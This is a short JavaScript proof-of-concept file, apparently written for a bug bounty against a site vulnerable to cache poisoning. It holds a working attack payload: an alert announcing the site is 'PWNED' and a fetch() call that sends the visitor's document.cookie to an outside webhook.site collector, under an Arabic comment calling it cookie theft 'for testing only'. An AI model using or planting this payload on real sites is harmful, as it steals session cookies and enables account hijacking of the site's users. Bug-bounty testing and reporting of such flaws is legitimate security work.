// poc.js - PoC for Zain Bug Bounty
alert("PWNED BY ZAIN BUG BOUNTY - Cache Poisoning Success!");
// سرقة الكوكيز (للاختبار فقط)
fetch('https://webhook.site/your-unique-id?cookie=' + encodeURIComponent(document.cookie));